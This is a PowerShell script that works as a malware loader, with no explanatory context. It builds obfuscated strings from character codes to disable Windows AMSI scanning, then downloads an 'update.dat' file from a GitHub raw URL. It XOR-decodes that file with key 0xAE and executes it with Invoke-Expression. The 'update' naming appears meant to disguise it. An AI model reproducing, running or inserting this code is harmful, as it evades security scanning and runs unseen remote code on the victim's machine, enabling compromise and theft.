try{$_a=[char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)-join'';$_b=[char[]]@(97,109,115,105,73,110,105,116,70,97,105,108,101,100)-join'';$_t=[Ref].Assembly.GetType($_a);$_f=$_t.GetField($_b,[Reflection.BindingFlags]40);$_f.SetValue($null,$true)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$_enc=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
$_code=[Text.Encoding]::UTF8.GetString(($_enc|%{$_-bxor0xAE}))
Invoke-Expression $_code